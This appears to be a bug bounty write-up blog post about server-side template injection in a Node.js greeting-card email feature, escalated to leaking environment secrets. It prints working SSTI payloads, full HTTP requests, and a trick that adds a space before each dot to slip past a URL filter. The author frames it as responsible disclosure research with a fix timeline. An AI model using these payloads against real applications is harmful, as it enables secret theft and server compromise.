---
title: "How a single space turned an email invitation into RCE"
description: "Escalating an SSTI in an email invitation feature to Node.js RCE and secret exposure by bypassing an unrelated URL filter with a single space."
draft: false
---

## Introduction

Welcome to my first published write-up! I'm 25 now, and I began my bug bounty journey back in 2020 when I was 19. After a few years of researching and reporting vulnerabilities, I wanted my first post to highlight an older finding that still stands out to me — hoping it inspires newcomers entering cybersecurity, and maybe reminds experienced researchers how far methodical, creative thinking can take you.

Today, AI has become an essential part of a security researcher's toolkit, speeding up our workflows without replacing the curiosity and intuition behind the work. That said, this vulnerability dates back to before AI became part of the day-to-day process. There were no automated exploit chains or specialized tools involved — just manual testing, careful observation, and paying close attention to how the backend behaved.

## Target overview

The target `redacted.com` offered a feature that allowed users to send **eGreeting Cards** to any email address. The workflow was straightforward:

1. Select a card design (template).
2. Enter the recipient's details (name and email address).
3. Write a custom message and send the card.

<!-- ![Card creation page](path/to/screenshot-1.png) -->

While testing the form, one detail immediately caught my attention: whenever a URL was included in any input field, such as the message box, the backend intercepted it and replaced it. In the recipient's inbox, the link appeared as `[link removed]`.

This was a useful observation — it indicated that custom preprocessing logic was running on the server before the email was rendered and delivered.

## Discovering the SSTI

Because the application took user-supplied text and rendered it inside an email template on the backend — and allowed the sender to specify any recipient address — Server-Side Template Injection (SSTI) was a natural vector to explore. By setting an email address under my control as the recipient, I could use the delivered email itself to inspect how the server evaluated my input.

I began testing basic SSTI payloads in the message field and inspecting the resulting emails. When I submitted:

```text
#{7*7}
```

The email arrived in my inbox displaying:

```text
49
```

That confirmed it: user input was being evaluated directly by a server-side Node.js template engine.

```http
POST /sendGreetingCardEmail HTTP/1.1
Host: www.redacted.com
Origin: https://www.redacted.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: connect.sid=[REDACTED]

emailInformation%5Bmessage%5D=%23%7b7*7%7d&emailInformation%5BcardID%5D=1&emailInformation%5BrecipientEmail%5D=attacker@example.com&emailInformation%5BdeliveryDate%5D=&_csrf_token=[REDACTED]
```

<!-- ![Received email rendering 49](path/to/screenshot-2.png) -->

## Bypassing the URL filter

Confirming template injection is a strong starting point, but to demonstrate the real security impact — remote code execution and sensitive data exposure — I needed to access the Node.js `process` object and retrieve environment variables containing secrets.

I submitted a payload to serialize values from `process`:

```javascript
#{JSON.stringify(Object.values(process)[59])}
```

Instead of returning the expected output, the email rendered:

```text
[link removed]
```

At first glance, this could easily be mistaken for a WAF or template-injection defense, but it was actually the same link filter I had noticed earlier. The backend appeared to use a regular expression that treated dot-separated words (such as `JSON.stringify` and `Object.values`) as domain names, flagging the expression as a URL and stripping it out before rendering.

This is where understanding the difference between a regex filter and an actual language parser makes all the difference.

In JavaScript, placing whitespace before a dot operator is completely valid syntax. To a simple URL regex, however, inserting a space breaks the `word.word` pattern it expects for a domain. All it took was adding a single space before each dot:

```javascript
#{JSON .stringify(Object .values(process)[59])}
```

With that small adjustment, the URL filter ignored the string entirely while the JavaScript engine executed it without issue. Because the `recipientEmail` parameter was set to an address under my control (`attacker@example.com`), the application rendered the server-side output and emailed the Node process environment variables and secrets straight to my inbox.

```http
POST /sendGreetingCardEmail HTTP/1.1
Host: www.redacted.com
Origin: https://www.redacted.com
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: connect.sid=[REDACTED]

emailInformation%5Bmessage%5D=%23%7bJSON%20.stringify(Object%20.values(process)%5b59%5d)%7d&emailInformation%5BcardID%5D=1&emailInformation%5BrecipientEmail%5D=attacker@example.com&emailInformation%5BdeliveryDate%5D=&_csrf_token=[REDACTED]
```

<!-- ![Redacted email showing leaked environment variables](path/to/screenshot-3.png) -->

The dumped environment essentially handed over the keys to the production stack — including cloud infrastructure credentials, production database and migration logins, live payment and billing API keys, internal signing secrets, and access tokens for third-party integrations. That alone was more than enough to demonstrate critical impact without touching any of those services or pushing the exploit any further.

## Looking beyond a single endpoint

The story didn't actually end with the eGreeting Card feature. Whenever I uncover a vulnerability like this, I make it a habit to check whether similar patterns exist elsewhere across the application.

After reporting the initial finding, I tested other API endpoints and email-related functionalities on `redacted.com` and discovered the exact same SSTI vulnerability affecting them as well. Because those endpoints were handled separately and did not share the same underlying backend or root cause, each finding was treated as an independent report — and rewarded individually.

## Key takeaways

What makes this vulnerability memorable to me is how simple the final bypass turned out to be. Turning a blocked payload into a high-impact finding doesn't always require an intricate exploit chain — sometimes an obstacle isn't even a security control, just an unrelated filter acting more broadly than intended, and a single space is enough to work around it.

If you're just getting started in bug bounty, try not to get discouraged when a payload gets stripped or blocked. Take a step back, figure out *why* the application reacted that way, and test how the underlying parser handles edge cases. That methodical mindset will serve you well at any stage of your journey, with or without AI.

Thanks for reading! If you have any thoughts, questions, or similar stories to share, feel free to reach out — I'm always happy to connect with fellow researchers.

## Disclosure timeline

- **2022-09-29:** Vulnerability reported
- **2022-10-02:** Triaged as **Critical (CVSS 10.0)**
- **2022-10-03:** Resolved & bounty awarded
